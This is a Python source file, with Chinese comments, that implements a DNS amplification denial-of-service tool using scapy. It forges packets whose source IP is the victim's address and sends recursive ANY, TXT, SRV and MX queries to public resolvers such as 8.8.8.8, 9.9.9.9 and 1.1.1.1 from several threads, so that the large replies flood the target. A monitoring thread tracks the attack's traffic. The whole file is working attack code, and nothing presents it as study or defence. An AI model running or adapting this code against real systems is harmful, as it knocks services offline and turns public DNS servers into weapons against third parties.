from scapy.all import IP, UDP, DNS, DNSQR, send
import threading
import random
import time
from utils.monitor import AttackMonitor

class DNSAmplification:
    def __init__(self, target_ip, dns_servers=None, num_threads=4):
        self.target_ip = target_ip
        self.dns_servers = dns_servers or [
            "8.8.8.8",  # Google DNS
            "8.8.4.4",
            "9.9.9.9",  # Quad9
            "1.1.1.1",  # Cloudflare
        ]
        self.num_threads = num_threads
        self.running = False
        self.monitor = AttackMonitor()
        
        # 可能产生大量响应的DNS查询类型
        self.query_types = [
            'ANY',
            'TXT',
            'SRV',
            'MX'
        ]
        
        # 要查询的域名列表
        self.domains = [
            "google.com",
            "facebook.com",
            "amazon.com",
            "microsoft.com"
        ]
    
    def generate_random_ip(self):
        """生成随机源IP地址"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}." \
               f"{random.randint(1,254)}.{random.randint(1,254)}"
    
    def dns_amplification(self):
        while self.running:
            source_ip = self.target_ip  # 伪造源IP为目标IP
            dns_server = random.choice(self.dns_servers)
            domain = random.choice(self.domains)
            qtype = random.choice(self.query_types)
            
            # 构建DNS查询包
            ip = IP(src=source_ip, dst=dns_server)
            udp = UDP(sport=random.randint(1024, 65535), dport=53)
            dns = DNS(
                rd=1,  # 递归查询
                qd=DNSQR(
                    qname=domain,
                    qtype=qtype
                )
            )
            
            try:
                send(ip/udp/dns, verbose=False)
                self.monitor.update_stats("dns_amp", 1)
                time.sleep(random.uniform(0.05, 0.1))
            except Exception as e:
                print(f"发送失败: {e}")
    
    def start_attack(self):
        self.running = True
        threads = []
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.dns_amplification)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # 启动监控线程
        monitor_thread = threading.Thread(target=self.monitor.start_monitoring)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return threads
    
    def stop_attack(self):
        self.running = False
        return self.monitor.get_stats() 